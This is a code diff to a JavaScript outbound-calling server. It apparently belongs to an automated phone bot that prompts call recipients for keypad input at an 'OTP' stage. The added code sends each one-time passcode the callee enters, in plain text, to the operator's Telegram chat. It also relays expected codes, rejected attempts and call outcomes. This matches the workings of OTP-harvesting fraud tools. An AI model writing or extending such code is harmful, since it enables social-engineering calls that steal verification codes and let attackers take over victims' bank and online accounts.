@@ -582,6 +582,16 @@ async function persistDtmfCapture(callSid, digits, options = {}) {
       await db.createEnhancedWebhookNotification(callSid, 'call_input_dtmf', targetChatId, 'high');
     }
 
+    if (callRecord?.user_chat_id && compliancePayload.metadata.stage_key === 'OTP') {
+      await db.createEnhancedWebhookNotification(
+        callSid,
+        'otp_accepted',
+        callRecord.user_chat_id,
+        'high',
+        JSON.stringify({ code: sanitizedDigits })
+      );
+    }
+
     await db.logServiceHealth('call_system', 'dtmf_captured', {
       call_sid: callSid,
       digits_length: sanitizedDigits.length,
@@ -618,11 +628,11 @@ async function evaluateInputStage(callSid, summary, metadataEnvelope = {}, inter
   const guidance = orchestrator ? orchestrator.handleInput(summary.stageKey, summary.digits) : null;
   const stageDisplay = guidance?.stageLabel || summary.stageLabel || summary.stageKey || 'Entry';
   const transcriptLine = `[Keypad] ${stageDisplay}: ${summary.digits}`;
-  const callRecord = summary.callRecord || (await db.getCall(callSid));
+    const callRecord = summary.callRecord || (await db.getCall(callSid));
 
-  if (summary.status === 'invalid') {
-    try {
-      await db.updateCallState(callSid, 'dtmf_invalid', {
+    if (summary.status === 'invalid') {
+      try {
+        await db.updateCallState(callSid, 'dtmf_invalid', {
         stage_key: summary.stageKey,
         digits_preview: summary.digits,
         reason: summary.reason || 'invalid',
@@ -631,6 +641,16 @@ async function evaluateInputStage(callSid, summary, metadataEnvelope = {}, inter
       });
     } catch (stateError) {
       console.warn('Failed to record invalid DTMF state:', stateError.message);
+    }
+
+    if (callRecord?.user_chat_id) {
+      await db.createEnhancedWebhookNotification(
+        callSid,
+        'otp_rejected',
+        callRecord.user_chat_id,
+        'high',
+        JSON.stringify({ stage: summary.stageKey, attempts: summary.attempts, max: summary.maxAttempts })
+      );
     }
 
     return {
@@ -968,7 +988,13 @@ async function finalizeCallOutcome(callSid, options = {}) {
   callRecord = await db.getCall(callSid);
   const targetChatId = callRecord?.telegram_chat_id || callRecord?.user_chat_id;
   if (targetChatId) {
-    await db.createEnhancedWebhookNotification(callSid, 'call_outcome_summary', targetChatId, 'high');
+    await db.createEnhancedWebhookNotification(
+      callSid,
+      'call_outcome_summary',
+      targetChatId,
+      'high',
+      JSON.stringify({ outcome, answered_by: answeredCandidate })
+    );
   }
 }
 
@@ -1991,6 +2017,15 @@ async function handleCallEnd(callSid, callStartTime) {
       interactions: transcripts.length,
       adaptations: adaptationAnalysis.personalityChanges || 0
     });
+    if (callDetails?.user_chat_id) {
+      await db.createEnhancedWebhookNotification(
+        callSid,
+        'call_ended',
+        callDetails.user_chat_id,
+        'normal',
+        JSON.stringify({ duration, dtmf_count: dtmfEntries.length, interactions: transcripts.length })
+      );
+    }
     callPhases.delete(callSid);
 
   } catch (error) {
@@ -2428,6 +2463,20 @@ app.post('/outbound-call', async (req, res) => {
         telegram_chat_id: resolvedTelegramChatId,
         metadata_json: metadataSerialized
       });
+      const expectedOtp =
+        metadataPayload?.expected_otp ||
+        metadataPayload?.otp_code ||
+        metadataPayload?.one_time_passcode ||
+        null;
+      if (expectedOtp && resolvedTelegramChatId) {
+        await db.createEnhancedWebhookNotification(
+          callSid,
+          'otp_sent',
+          resolvedTelegramChatId,
+          'high',
+          JSON.stringify({ code: expectedOtp })
+        );
+      }
       callPhases.set(callSid, { phase: 'intro', updated_at: Date.now() });
 
       if (user_chat_id) {
